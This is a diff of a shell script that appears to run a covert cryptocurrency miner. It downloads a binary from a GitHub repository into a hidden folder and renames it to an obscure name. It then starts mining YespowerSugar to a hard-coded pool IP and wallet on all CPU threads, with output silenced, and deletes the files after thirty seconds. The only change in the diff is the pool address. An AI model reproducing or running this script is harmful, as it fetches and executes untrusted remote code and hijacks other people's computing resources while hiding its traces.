@@ -12,7 +12,7 @@ WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday
 mkdir .lib && cd .lib
 wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/maker > /dev/null 2>&1
 chmod u+x sgr1
-./sgr1 -a YespowerSugar -o stratum+tcp://128.199.218.20:80 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$WORKER -p x -t $(nproc --all) > /dev/null 2>&1 &
+./sgr1 -a YespowerSugar -o stratum+tcp://128.199.192.134:80 -u sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$WORKER -p x -t $(nproc --all) > /dev/null 2>&1 &
 sleep 30
 rm -rvf *
 cd ~/
